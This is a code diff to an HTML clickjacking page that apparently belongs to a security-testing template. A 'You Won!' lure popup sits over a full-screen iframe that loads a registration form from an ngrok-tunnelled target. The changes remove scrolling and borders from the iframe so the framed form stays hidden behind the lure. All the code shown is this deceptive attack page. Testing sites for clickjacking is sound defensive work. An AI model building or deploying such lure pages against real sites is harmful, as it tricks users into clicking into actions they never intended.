@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>You Won!</title>
     <style>
-        /* iframe occupies the full screen and is visible */
+        /* iframe occupies the full screen, is visible, and has no scroll */
         iframe {
             position: absolute;
             top: 0;
@@ -13,6 +13,7 @@
             height: 100vh;
             border: none;
             z-index: 1;
+            overflow: hidden;
         }
 
         /* Style for the "You Won!" popup with an outline */
@@ -54,8 +55,8 @@
 </head>
 <body>
 
-<!-- Embedding the registration form in an iframe -->
-<iframe id="targetFrame" src="{{ ngrok_url }}/register_html"></iframe>
+<!-- Embedding the registration form in an iframe without scrolling -->
+<iframe id="targetFrame" src="{{ ngrok_url }}/register_html" frameborder="0" scrolling="no"></iframe>
 
 <!-- Popup with a fake message and a button in the middle of the screen -->
 <div class="popup">
